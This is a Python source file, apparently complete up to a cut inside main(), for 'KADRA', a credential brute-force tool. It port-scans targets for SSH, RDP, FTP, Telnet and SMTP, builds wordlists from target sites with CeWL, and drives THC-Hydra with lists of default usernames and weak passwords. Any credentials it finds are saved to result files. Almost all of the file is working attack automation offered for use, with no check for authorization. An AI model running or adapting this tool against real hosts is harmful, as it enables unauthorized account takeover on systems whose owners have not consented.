#!/usr/bin/env python3

"""
██╗  ██╗ █████╗ ██████╗ ██████╗  █████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╔╝ ███████║██║  ██║██████╔╝███████║
██╔═██╗ ██╔══██║██║  ██║██╔══██╗██╔══██║
██║  ██╗██║  ██║██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝

KADRA - Credential Bruteforce Automation Tool
Version 1.0 | Author: [REDACTED]

Targeted brute force against SMTP, RDP, FTP, Telnet, SSH
with intelligent wordlist management and Hydra integration.
"""

import os
import sys
import time
import json
import socket
import subprocess
import threading
import ipaddress
import argparse
import logging
import hashlib
import re
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============================================
# COLOR CLASS FOR TERMINAL OUTPUT
# ============================================
class Colors:
    """ANSI color codes for terminal output"""
    # Reset
    RESET = '\033[0m'
    
    # Regular Colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    
    # Bold Colors
    BOLD = '\033[1m'
    BOLD_RED = '\033[1;31m'
    BOLD_GREEN = '\033[1;32m'
    BOLD_YELLOW = '\033[1;33m'
    BOLD_BLUE = '\033[1;34m'
    BOLD_MAGENTA = '\033[1;35m'
    BOLD_CYAN = '\033[1;36m'
    BOLD_WHITE = '\033[1;37m'
    
    # Background Colors
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    
    # Styles
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
    @staticmethod
    def colorize(text: str, color_code: str) -> str:
        """Apply color to text"""
        return f"{color_code}{text}{Colors.RESET}"
    
    @staticmethod
    def success(text: str) -> str:
        """Success message in green"""
        return Colors.colorize(f"[+] {text}", Colors.BOLD_GREEN)
    
    @staticmethod
    def info(text: str) -> str:
        """Info message in cyan"""
        return Colors.colorize(f"[*] {text}", Colors.BOLD_CYAN)
    
    @staticmethod
    def warning(text: str) -> str:
        """Warning message in yellow"""
        return Colors.colorize(f"[!] {text}", Colors.BOLD_YELLOW)
    
    @staticmethod
    def error(text: str) -> str:
        """Error message in red"""
        return Colors.colorize(f"[-] {text}", Colors.BOLD_RED)
    
    @staticmethod
    def debug(text: str) -> str:
        """Debug message in magenta"""
        return Colors.colorize(f"[~] {text}", Colors.MAGENTA)
    
    @staticmethod
    def header(text: str) -> str:
        """Header text"""
        return Colors.colorize(f"\n{text}", Colors.BOLD_WHITE + Colors.BG_BLUE)
    
    @staticmethod
    def progress(text: str) -> str:
        """Progress indicator"""
        return Colors.colorize(f"[>] {text}", Colors.BOLD_BLUE)
    
    @staticmethod
    def credential(text: str) -> str:
        """Credential highlight"""
        return Colors.colorize(text, Colors.BOLD_GREEN)
    
    @staticmethod
    def service(text: str) -> str:
        """Service name highlight"""
        return Colors.colorize(text, Colors.BOLD_YELLOW)
    
    @staticmethod
    def target(text: str) -> str:
        """Target highlight"""
        return Colors.colorize(text, Colors.BOLD_CYAN)

# ============================================
# CONFIGURATION
# ============================================
class Config:
    """KADRA Configuration"""
    
    # Service ports and Hydra modules
    SERVICES = {
        'ssh': {
            'port': 22,
            'hydra_module': 'ssh',
            'protocol': 'tcp',
            'timeout': 30,
            'max_attempts': 3,
            'color': Colors.BOLD_MAGENTA
        },
        'rdp': {
            'port': 3389,
            'hydra_module': 'rdp',
            'protocol': 'tcp',
            'timeout': 45,
            'max_attempts': 2,
            'color': Colors.BOLD_BLUE
        },
        'ftp': {
            'port': 21,
            'hydra_module': 'ftp',
            'protocol': 'tcp',
            'timeout': 25,
            'max_attempts': 3,
            'color': Colors.BOLD_YELLOW
        },
        'telnet': {
            'port': 23,
            'hydra_module': 'telnet',
            'protocol': 'tcp',
            'timeout': 20,
            'max_attempts': 3,
            'color': Colors.BOLD_CYAN
        },
        'smtp': {
            'port': 25,
            'hydra_module': 'smtp',
            'protocol': 'tcp',
            'timeout': 30,
            'max_attempts': 2,
            'color': Colors.BOLD_RED
        }
    }
    
    # Performance settings
    MAX_THREADS = 5
    SCAN_TIMEOUT = 10
    BRUTE_TIMEOUT = 300
    
    # Paths
    BASE_DIR = Path(__file__).parent.absolute()
    TARGETS_FILE = BASE_DIR / "targets.txt"
    PASSLIST_FILE = BASE_DIR / "passlist.txt"
    WORDLIST_DIR = BASE_DIR / "wordlists"
    RESULTS_DIR = BASE_DIR / "results"
    LOG_FILE = BASE_DIR / "kadra.log"
    
    # Hydra settings
    HYDRA_RATE_LIMIT = 5  # Attempts per second
    HYDRA_TASKS = 16      # Parallel tasks
    
    # CeWL settings (for wordlist generation)
    CEWL_DEPTH = 2
    CEWL_MIN_WORD_LEN = 3
    CEWL_OPTIONS = "--with-numbers --lowercase"
    
    # UI Settings
    PROGRESS_BAR_LENGTH = 50

# ============================================
# LOGGING SETUP WITH COLORS
# ============================================
class ColorFormatter(logging.Formatter):
    """Custom formatter with colors for different log levels"""
    
    FORMATS = {
        logging.DEBUG: Colors.colorize("%(asctime)s - [~] %(message)s", Colors.MAGENTA),
        logging.INFO: Colors.colorize("%(asctime)s - [*] %(message)s", Colors.BOLD_CYAN),
        logging.WARNING: Colors.colorize("%(asctime)s - [!] %(message)s", Colors.BOLD_YELLOW),
        logging.ERROR: Colors.colorize("%(asctime)s - [-] %(message)s", Colors.BOLD_RED),
        logging.CRITICAL: Colors.colorize("%(asctime)s - [CRITICAL] %(message)s", Colors.BOLD_RED + Colors.BG_YELLOW)
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt='%H:%M:%S')
        return formatter.format(record)

def setup_logging(verbose=False):
    """Configure logging with colors"""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    logger = logging.getLogger()
    logger.setLevel(log_level)
    
    # Remove existing handlers
    logger.handlers.clear()
    
    # Console handler with colors
    console_handler = logging.StreamHandler()
    console_handler.setLevel(log_level)
    console_handler.setFormatter(ColorFormatter())
    
    # File handler (no colors)
    file_handler = logging.FileHandler(Config.LOG_FILE)
    file_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    file_handler.setFormatter(file_formatter)
    file_handler.setLevel(logging.DEBUG)
    
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    # Suppress Hydra's verbose output
    logging.getLogger('subprocess').setLevel(logging.WARNING)
    
    return logger

# ============================================
# BANNER WITH COLORS
# ============================================
def print_banner():
    """Print KADRA banner with colors"""
    banner = f"""
{Colors.BOLD_CYAN}
██╗  ██╗ █████╗ ██████╗ ██████╗  █████╗ 
██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗
█████╔╝ ███████║██║  ██║██████╔╝███████║
██╔═██╗ ██╔══██║██║  ██║██╔══██╗██╔══██║
██║  ██╗██║  ██║██████╔╝██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝{Colors.RESET}

{Colors.BOLD_WHITE}KADRA - Credential Bruteforce Automation v1.0{Colors.RESET}
{Colors.BOLD_YELLOW}Targeting: {Colors.service('SSH')} | {Colors.service('RDP')} | {Colors.service('FTP')} | {Colors.service('Telnet')} | {Colors.service('SMTP')}{Colors.RESET}
{Colors.BOLD_CYAN}─────────────────────────────────────────────────────────────{Colors.RESET}
    """
    print(banner)

# ============================================
# PROGRESS INDICATOR
# ============================================
class ProgressBar:
    """Animated progress bar for long operations"""
    
    @staticmethod
    def show(current: int, total: int, prefix: str = "", suffix: str = ""):
        """Display progress bar"""
        percent = 100 * (current / float(total))
        filled_length = int(Config.PROGRESS_BAR_LENGTH * current // total)
        bar = f"{Colors.BOLD_GREEN}█{Colors.RESET}" * filled_length + f"{Colors.BLACK}█{Colors.RESET}" * (Config.PROGRESS_BAR_LENGTH - filled_length)
        
        print(f"\r{Colors.progress(prefix)} |{bar}| {percent:.1f}% {suffix}", end="\r")
        if current == total:
            print()

# ============================================
# TARGET MANAGEMENT
# ============================================
class TargetManager:
    """Handle target loading and validation"""
    
    @staticmethod
    def load_targets(filename: str = None) -> List[str]:
        """Load targets from file"""
        if filename is None:
            filename = Config.TARGETS_FILE
        
        targets = []
        
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
                total_lines = len(lines)
                
                for i, line in enumerate(lines, 1):
                    ProgressBar.show(i, total_lines, "Loading targets", f"{i}/{total_lines}")
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if TargetManager.validate_target(line):
                            targets.append(line)
                        else:
                            logging.warning(f"Invalid target format: {line}")
            
            logging.info(Colors.info(f"Loaded {len(targets)} valid targets"))
            print()
            return targets
            
        except FileNotFoundError:
            logging.error(f"Targets file not found: {filename}")
            return []
    
    @staticmethod
    def validate_target(target: str) -> bool:
        """Validate target format"""
        try:
            # Check if it's an IP address
            ipaddress.ip_address(target)
            return True
        except ValueError:
            # Check if it's a valid domain
            if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target):
                return True
            # Check if it's a URL
            if re.match(r'^https?://', target):
                # Extract domain from URL
                import urllib.parse
                parsed = urllib.parse.urlparse(target)
                return bool(parsed.netloc)
        return False
    
    @staticmethod
    def resolve_target(target: str) -> str:
        """Resolve domain to IP address"""
        try:
            # If it's already an IP, return it
            ipaddress.ip_address(target)
            return target
        except ValueError:
            # Try to resolve domain
            try:
                ip = socket.gethostbyname(target)
                logging.debug(f"Resolved {Colors.target(target)} → {Colors.target(ip)}")
                return ip
            except socket.gaierror:
                logging.error(f"Could not resolve {Colors.target(target)}")
                return target

# ============================================
# WORDLIST GENERATOR (CeWL)
# ============================================
class WordlistGenerator:
    """Generate wordlists from target URLs using CeWL"""
    
    def __init__(self):
        self.cewl_path = self._find_cewl()
    
    def _find_cewl(self) -> str:
        """Find CeWL installation"""
        locations = [
            '/usr/bin/cewl',
            '/usr/local/bin/cewl',
            '/opt/cewl/cewl',
            '/usr/share/cewl/cewl'
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                logging.debug(f"Found CeWL at: {loc}")
                return loc
        
        # Try to find in PATH
        try:
            result = subprocess.run(['which', 'cewl'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        logging.warning("CeWL not found! Wordlist generation disabled.")
        return None
    
    def generate_from_url(self, url: str, target_name: str) -> Optional[str]:
        """Generate wordlist from URL using CeWL"""
        if not self.cewl_path:
            return None
        
        # Ensure wordlist directory exists
        Config.WORDLIST_DIR.mkdir(exist_ok=True)
        
        wordlist_file = Config.WORDLIST_DIR / f"{target_name}.txt"
        
        # Build CeWL command
        cmd = [
            self.cewl_path,
            url,
            '-d', str(Config.CEWL_DEPTH),
            '-m', str(Config.CEWL_MIN_WORD_LEN),
            '-w', str(wordlist_file)
        ]
        
        # Add options
        if Config.CEWL_OPTIONS:
            cmd.extend(Config.CEWL_OPTIONS.split())
        
        logging.info(f"Generating wordlist for {Colors.target(target_name)} from {Colors.target(url)}")
        
        try:
            print(f"{Colors.progress('Generating wordlist')} {Colors.target(target_name)}...", end="")
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=180  # 3 minute timeout
            )
            
            if process.returncode == 0 and wordlist_file.exists():
                # Count lines in generated wordlist
                with open(wordlist_file, 'r') as f:
                    line_count = sum(1 for _ in f)
                
                print(f"\r{Colors.success(f'Generated wordlist with {line_count:,} words for {target_name}')}")
                return str(wordlist_file)
            else:
                print(f"\r{Colors.error(f'CeWL failed for {target_name}')}")
                logging.debug(f"CeWL stderr: {process.stderr[:100]}")
                return None
                
        except subprocess.TimeoutExpired:
            print(f"\r{Colors.error(f'CeWL timed out for {target_name}')}")
            return None
        except Exception as e:
            print(f"\r{Colors.error(f'CeWL error for {target_name}: {str(e)[:50]}')}")
            return None
    
    def generate_for_targets(self, targets: List[str]) -> Dict[str, str]:
        """Generate wordlists for all targets"""
        wordlists = {}
        url_targets = [t for t in targets if re.match(r'^https?://', t)]
        
        if not url_targets:
            logging.info(Colors.info("No URLs found for wordlist generation"))
            return {}
        
        print(f"{Colors.info(f'Generating wordlists for {len(url_targets)} URL(s)')}")
        
        for i, target in enumerate(url_targets, 1):
            # Extract filename-safe target name
            target_name = target.replace('://', '_').replace('/', '_').replace('.', '_')
            if len(target_name) > 50:
                target_name = target_name[:50]
            
            ProgressBar.show(i, len(url_targets), "Generating wordlists", f"{i}/{len(url_targets)}")
            
            wordlist = self.generate_from_url(target, target_name)
            if wordlist:
                wordlists[target] = wordlist
        
        if wordlists:
            print(f"\n{Colors.success(f'Generated {len(wordlists)} wordlist(s)')}")
        
        return wordlists

# ============================================
# PORT SCANNER WITH VISUAL OUTPUT
# ============================================
class PortScanner:
    """Scan for specific service ports"""
    
    def __init__(self):
        self.services = Config.SERVICES
    
    def scan_target(self, target_ip: str) -> Dict[str, bool]:
        """Scan target for open service ports"""
        open_services = {}
        
        print(f"{Colors.info(f'Scanning {Colors.target(target_ip)} for services...')}")
        
        for service_name, service_info in self.services.items():
            port = service_info['port']
            service_color = service_info.get('color', Colors.BOLD_WHITE)
            
            if self.check_port(target_ip, port):
                open_services[service_name] = True
                status = f"{Colors.BOLD_GREEN}✓ OPEN{Colors.RESET}"
                print(f"  {service_color}{service_name.upper():6}{Colors.RESET} :{port:<5} {status}")
            else:
                open_services[service_name] = False
                status = f"{Colors.RED}✗ CLOSED{Colors.RESET}"
                print(f"  {service_color}{service_name.upper():6}{Colors.RESET} :{port:<5} {status}")
        
        return open_services
    
    def check_port(self, host: str, port: int) -> bool:
        """Check if a specific port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(Config.SCAN_TIMEOUT)
            
            result = sock.connect_ex((host, port))
            sock.close()
            
            return result == 0
            
        except Exception as e:
            logging.debug(f"Port check error {host}:{port}: {e}")
            return False
    
    def scan_targets(self, targets: List[str]) -> Dict[str, Dict[str, bool]]:
        """Scan multiple targets for open services"""
        results = {}
        
        print(f"{Colors.header('SERVICE DISCOVERY PHASE')}")
        
        with ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
            future_to_target = {
                executor.submit(self.scan_target, target): target 
                for target in targets
            }
            
            for i, future in enumerate(as_completed(future_to_target), 1):
                target = future_to_target[future]
                try:
                    results[target] = future.result()
                    ProgressBar.show(i, len(targets), "Scanning targets", f"{i}/{len(targets)}")
                except Exception as e:
                    logging.error(f"Scan failed for {Colors.target(target)}: {e}")
                    results[target] = {}
        
        print(f"\n{Colors.success('Service discovery completed!')}")
        return results

# ============================================
# PASSWORD LIST MANAGER
# ============================================
class PasswordManager:
    """Manage password lists"""
    
    @staticmethod
    def load_passlist(filename: str = None) -> List[str]:
        """Load password list from file"""
        if filename is None:
            filename = Config.PASSLIST_FILE
        
        passwords = []
        
        try:
            print(f"{Colors.progress('Loading password list')} {Colors.target(str(filename))}...", end="")
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        passwords.append(line)
            
            print(f"\r{Colors.success(f'Loaded {len(passwords):,} passwords from {filename.name}')}")
            return passwords
            
        except FileNotFoundError:
            print(f"\r{Colors.error(f'Password file not found: {filename}')}")
            
            # Create default passlist if it doesn't exist
            default_passwords = [
                'admin', 'password', '123456', 'password123',
                'administrator', 'root', 'toor', 'admin123',
                'test', 'guest', 'qwerty', 'letmein'
            ]
            
            with open(filename, 'w') as f:
                for pwd in default_passwords:
                    f.write(pwd + '\n')
            
            logging.info(Colors.info(f"Created default password list with {len(default_passwords)} entries"))
            return default_passwords
    
    @staticmethod
    def load_wordlist(filename: str) -> List[str]:
        """Load wordlist from file"""
        if not os.path.exists(filename):
            return []
        
        words = []
        try:
            with open(filename, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        words.append(line)
            
            logging.debug(f"Loaded {len(words):,} words from {filename}")
            return words
            
        except Exception as e:
            logging.error(f"Failed to load wordlist {filename}: {e}")
            return []

# ============================================
# HYDRA BRUTEFORCE ENGINE
# ============================================
class HydraEngine:
    """Hydra wrapper for brute force attacks"""
    
    def __init__(self):
        self.hydra_path = self._find_hydra()
    
    def _find_hydra(self) -> str:
        """Find Hydra installation"""
        locations = [
            '/usr/bin/hydra',
            '/usr/local/bin/hydra',
            '/usr/share/hydra/hydra'
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                logging.debug(f"Found Hydra at: {loc}")
                return loc
        
        # Try to find in PATH
        try:
            result = subprocess.run(['which', 'hydra'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        logging.error("Hydra not found! Please install THC-Hydra.")
        return None
    
    def build_hydra_command(self, target_ip: str, service: str, 
                           username: str = None, password_file: str = None,
                           username_file: str = None) -> List[str]:
        """Build Hydra command for specific service"""
        if not self.hydra_path:
            return None
        
        service_info = Config.SERVICES.get(service)
        if not service_info:
            return None
        
        cmd = [
            self.hydra_path,
            '-I',  # Skip waiting
            '-t', str(Config.HYDRA_TASKS),
            '-w', str(service_info['timeout']),
            '-f',  # Exit after first found password
            '-o', '/dev/stdout',  # Output to stdout
            '-b', 'json'  # JSON output format
        ]
        
        # Add service-specific options
        hydra_module = service_info['hydra_module']
        
        if service == 'rdp':
            cmd.extend(['-V'])  # Show attempts for RDP
        
        # Add target
        target_spec = f"{hydra_module}://{target_ip}:{service_info['port']}"
        
        # Add credentials
        if username and password_file:
            # Single username, password list
            cmd.extend(['-l', username, '-P', password_file, target_spec])
        elif username_file and password_file:
            # Username list and password list
            cmd.extend(['-L', username_file, '-P', password_file, target_spec])
        elif username:
            # Single username, single password (for testing)
            cmd.extend(['-l', username, '-p', password_file, target_spec])
        else:
            # Default to root username with password list
            cmd.extend(['-l', 'root', '-P', password_file, target_spec])
        
        return cmd
    
    def execute_attack(self, target_ip: str, service: str, 
                      password_file: str, username: str = None,
                      username_file: str = None) -> Dict:
        """Execute Hydra attack and parse results"""
        if not self.hydra_path:
            return {'error': 'Hydra not found'}
        
        cmd = self.build_hydra_command(target_ip, service, username, 
                                      password_file, username_file)
        
        if not cmd:
            return {'error': 'Could not build command'}
        
        service_color = Config.SERVICES[service].get('color', Colors.BOLD_WHITE)
        logging.info(f"Executing Hydra against {service_color}{service.upper()}{Colors.RESET} on {Colors.target(target_ip)}")
        
        try:
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=Config.BRUTE_TIMEOUT
            )
            
            result = {
                'command': ' '.join(cmd),
                'returncode': process.returncode,
                'stdout': process.stdout,
                'stderr': process.stderr,
                'success': False,
                'credentials': []
            }
            
            # Parse Hydra JSON output
            if process.stdout:
                try:
                    # Hydra outputs JSON lines, need to find the result line
                    for line in process.stdout.strip().split('\n'):
                        if line.startswith('{'):
                            data = json.loads(line)
                            if 'results' in data:
                                for res in data['results']:
                                    if 'login' in res and 'password' in res:
                                        result['credentials'].append({
                                            'username': res['login'],
                                            'password': res['password'],
                                            'service': service,
                                            'host': target_ip,
                                            'port': Config.SERVICES[service]['port']
                                        })
                                        result['success'] = True
                except json.JSONDecodeError:
                    # Try to parse traditional output
                    for line in process.stdout.split('\n'):
                        if 'login' in line.lower() and 'password' in line.lower():
                            parts = line.split()
                            if len(parts) >= 4:
                                result['credentials'].append({
                                    'username': parts[1],
                                    'password': parts[3],
                                    'service': service,
                                    'host': target_ip,
                                    'port': Config.SERVICES[service]['port']
                                })
                                result['success'] = True
            
            return result
            
        except subprocess.TimeoutExpired:
            logging.warning(f"Hydra timeout for {target_ip}:{service}")
            return {'error': 'timeout', 'success': False}
        except Exception as e:
            logging.error(f"Hydra execution error: {e}")
            return {'error': str(e), 'success': False}
    
    def test_credential(self, target_ip: str, service: str, 
                       username: str, password: str) -> bool:
        """Test a single credential quickly"""
        # Create temp file with single password
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            f.write(password + '\n')
            temp_file = f.name
        
        try:
            result = self.execute_attack(target_ip, service, temp_file, username)
            return result.get('success', False)
        finally:
            # Cleanup temp file
            try:
                os.unlink(temp_file)
            except:
                pass

# ============================================
# BRUTEFORCE ORCHESTRATOR WITH VISUAL OUTPUT
# ============================================
class BruteforceOrchestrator:
    """Orchestrate brute force attacks"""
    
    def __init__(self):
        self.scanner = PortScanner()
        self.hydra = HydraEngine()
        self.results = {}
        
        # Ensure results directory exists
        Config.RESULTS_DIR.mkdir(exist_ok=True)
    
    def run_against_target(self, target: str, wordlists: Dict[str, str]) -> Dict:
        """Run complete brute force against a single target"""
        target_results = {
            'target': target,
            'ip': TargetManager.resolve_target(target),
            'open_services': {},
            'credentials_found': [],
            'timestamp': datetime.now().isoformat()
        }
        
        target_ip = target_results['ip']
        
        print(f"\n{Colors.header(f'ATTACKING TARGET: {Colors.target(target)}')}")
        print(f"{Colors.info(f'Resolved IP: {Colors.target(target_ip)}')}")
        
        # 1. Scan for open services
        open_services = self.scanner.scan_target(target_ip)
        target_results['open_services'] = open_services
        
        # Check if any services are open
        open_count = sum(1 for is_open in open_services.values() if is_open)
        if open_count == 0:
            print(f"{Colors.warning(f'No open services found on {Colors.target(target_ip)}')}")
            return target_results
        
        print(f"{Colors.success(f'Found {open_count} open service(s)')}")
        
        # 2. Load common password list
        common_passwords = PasswordManager.load_passlist()
        
        # 3. Load target-specific wordlist if available
        target_wordlist = wordlists.get(target)
        target_words = []
        if target_wordlist and os.path.exists(target_wordlist):
            target_words = PasswordManager.load_wordlist(target_wordlist)
        
        # 4. Attack each open service
        print(f"\n{Colors.header('BRUTEFORCE PHASE')}")
        for service, is_open in open_services.items():
            if not is_open:
                continue
            
            service_color = Config.SERVICES[service].get('color', Colors.BOLD_WHITE)
            print(f"\n{Colors.progress(f'Attacking {service_color}{service.upper()}{Colors.RESET} service...')}")
            
            # Try common passwords first
            creds = self.attack_service(
                target_ip, service, common_passwords, 
                use_common=True, target_name=target
            )
            
            if creds:
                target_results['credentials_found'].extend(creds)
                print(f"  {Colors.success(f'Found {len(creds)} credential(s) with common passwords!')}")
                continue  # Move to next service
            
            # If no success with common passwords, try target wordlist
            if target_words:
                print(f"  {Colors.info('Trying target-specific wordlist...')}")
                creds = self.attack_service(
                    target_ip, service, target_words,
                    use_common=False, target_name=target
                )
                
                if creds:
                    target_results['credentials_found'].extend(creds)
                    print(f"  {Colors.success(f'Found {len(creds)} credential(s) with target wordlist!')}")
                else:
                    print(f"  {Colors.warning('No credentials found with target wordlist')}")
            else:
                print(f"  {Colors.warning('No target-specific wordlist available')}")
        
        return target_results
    
    def attack_service(self, target_ip: str, service: str, 
                      passwords: List[str], use_common: bool = True,
                      target_name: str = None) -> List[Dict]:
        """Attack a specific service with password list"""
        if not passwords:
            return []
        
        # Create temp password file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            for pwd in passwords[:1000]:  # Limit to first 1000 passwords for speed
                f.write(pwd + '\n')
            temp_file = f.name
        
        try:
            # Common usernames based on service
            common_usernames = self.get_service_usernames(service)
            
            # Try each common username
            for i, username in enumerate(common_usernames[:5], 1):  # Limit to first 5 usernames
                ProgressBar.show(i, min(5, len(common_usernames)), f"Testing {service}", f"User: {username}")
                
                result = self.hydra.execute_attack(
                    target_ip, service, temp_file, username
                )
                
                if result.get('success'):
                    # Add username to credentials
                    for cred in result['credentials']:
                        if 'username' not in cred or not cred['username']:
                            cred['username'] = username
                        cred['password_source'] = 'common' if use_common else 'target'
                    
                    print()  # New line after progress bar
                    return result['credentials']
            
            print()  # New line after progress bar
            return []
            
        finally:
            # Cleanup temp file
            try:
                os.unlink(temp_file)
            except:
                pass
    
    def get_service_usernames(self, service: str) -> List[str]:
        """Get common usernames for a service"""
        common = ['root', 'admin', 'administrator', 'test', 'guest', 'user']
        
        service_specific = {
            'ssh': ['root', 'ubuntu', 'debian', 'centos', 'ec2-user', 'pi'],
            'rdp': ['administrator', 'admin', 'user', 'test', 'guest'],
            'ftp': ['anonymous', 'ftp', 'admin', 'user'],
            'telnet': ['root', 'admin', 'cisco', 'admin'],
            'smtp': ['admin', 'postmaster', 'mail', 'root']
        }
        
        usernames = service_specific.get(service, common).copy()
        usernames.extend(common)  # Add generic usernames too
        
        # Remove duplicates while preserving order
        seen = set()
        unique_usernames = []
        for user in usernames:
            if user not in seen:
                seen.add(user)
                unique_usernames.append(user)
        
        return unique_usernames
    
    def run_against_targets(self, targets: List[str], wordlists: Dict[str, str]) -> Dict[str, Dict]:
        """Run brute force against multiple targets"""
        all_results = {}
        
        print(f"\n{Colors.header('STARTING BRUTEFORCE ATTACKS')}")
        print(f"{Colors.info(f'Targets: {len(targets)} | Threads: {Config.MAX_THREADS}')}")
        
        with ThreadPoolExecutor(max_workers=Config.MAX_THREADS) as executor:
            future_to_target = {
                executor.submit(self.run_against_target, target, wordlists): target 
                for target in targets
            }
            
            for i, future in enumerate(as_completed(future_to_target), 1):
                target = future_to_target[future]
                try:
                    all_results[target] = future.result()
                    ProgressBar.show(i, len(targets), "Overall progress", f"Target {i}/{len(targets)}")
                except Exception as e:
                    logging.error(f"Brute force failed for {Colors.target(target)}: {e}")
                    all_results[target] = {'error': str(e)}
        
        return all_results
    
    def save_results(self, target: str, results: Dict):
        """Save results to file"""
        # Create filename-safe target name
        target_safe = re.sub(r'[^\w\-_. ]', '_', target)
        if len(target_safe) > 50:
            target_safe = target_safe[:50]
        
        results_file = Config.RESULTS_DIR / f"{target_safe}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        logging.info(f"Results saved to {Colors.target(str(results_file))}")
        
        # Also save summary
        self.save_summary(target, results)
    
    def save_summary(self, target: str, results: Dict):
        """Save human-readable summary"""
        target_safe = re.sub(r'[^\w\-_. ]', '_', target)
        if len(target_safe) > 50:
            target_safe = target_safe[:50]
        
        summary_file = Config.RESULTS_DIR / f"{target_safe}_summary.txt"
        
        with open(summary_file, 'w') as f:
            f.write("=" * 60 + "\n")
            f.write(f"KADRA - Credential Bruteforce Summary\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Target: {results.get('target', 'NA')}\n")
            f.write(f"IP Address: {results.get('ip', 'NA')}\n")
            f.write(f"Scan Time: {results.get('timestamp', 'NA')}\n\n")
            
            f.write("Open Services:\n")
            for service, is_open in results.get('open_services', {}).items():
                status = "OPEN" if is_open else "closed"
                f.write(f"  {service.upper():10}  {status}\n")
            
            f.write("\nCredentials Found:\n")
            creds = results.get('credentials_found', [])
            if creds:
                for i, cred in enumerate(creds, 1):
                    f.write(f"  {i}. Service: {cred.get('service', 'NA')}\n")
                    f.write(f"     Username: {cred.get('username', 'NA')}\n")
                    f.write(f"     Password: {cred.get('password', 'NA')}\n")
                    f.write(f"     Source: {cred.get('password_source', 'NA')}\n")
                    f.write(f"     Host: {cred.get('host', 'NA')}:{cred.get('port', 'NA')}\n\n")
            else:
                f.write("  No credentials found.\n")
            
            f.write("=" * 60 + "\n")
        
        logging.debug(f"Summary saved to {summary_file}")

# ============================================
# MAIN EXECUTION
# ============================================
def main():
    """Main execution function"""
    
    print_banner()
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description='KADRA - Credential Bruteforce Automation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
{Colors.BOLD_YELLOW}Examples:{Colors.RESET}
  {Colors.BOLD_CYAN}python3 kadra.py{Colors.RESET}                         # Run with default targets.txt
  {Colors.BOLD_CYAN}python3 kadra.py --targets my_targets.txt{Colors.RESET}
  {Colors.BOLD_CYAN}python3 kadra.py --target 192.168.1.1{Colors.RESET}   # Single target
  {Colors.BOLD_CYAN}python3 kadra.py --no-wordlists{Colors.RESET}         # Skip wordlist generation
  {Colors.BOLD_CYAN}python3 kadra.py --verbose{Colors.RESET}              # Detailed output
  {Colors.BOLD_CYAN}python3 kadra.py --threads 10{Colors.RESET}           # Use 10 threads
        '''
    )
    
    parser.add_argument('--targets', type=str, 
                       default=str(Config.TARGETS_FILE),
                       help='Targets file (default: targets.txt)')
    parser.add_argument('--target', type=str,
                       help='Single target to attack')
    parser.add_argument('--passlist', type=str,
                       default=str(Config.PASSLIST_FILE),
                       help='Password list file (default: passlist.txt)')
    parser.add_argument('--no-wordlists', action='store_true',
                       help='Skip wordlist generation')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    parser.add_argument('--threads', type=int,
                       default=Config.MAX_THREADS,
                       help=f'Maximum threads (default: {Config.MAX_THREADS})')
    
    args = parser.parse_args()
    
    # Setup logging
    logger = setup_logging(args.verbose)
    
    # Update config based on arguments
    Config.TARGETS_FILE = Path(args.targets)
    Config.PASSLIST_FILE = Path(args.passlist)
    Config.MAX_THREADS = args.threads
    
    # Load targets
    targets = []
    if args.target:
        targets.append(args.target)
    else:
        targets = TargetManager.load_targets()
    
    if not targets:
        print(Colors.error("No valid targets found."))
        print(Colors.info(f"Create {Config.TARGETS_FILE} or use --target option"))
        sys.exit(1)
    
    # Generate wordlists (if not disabled)
    wordlists = {}
    if not args.no_wordlists:
        print(f"\n{Colors.header('WORDLIST GENERATION')}")
        generator = WordlistGenerator()
        wordlists = generator.generate_for_targets(targets)
    
    # Run brute force
    print(f"\n{Colors.header('STARTING KADRA BRUTEFORCE')}")
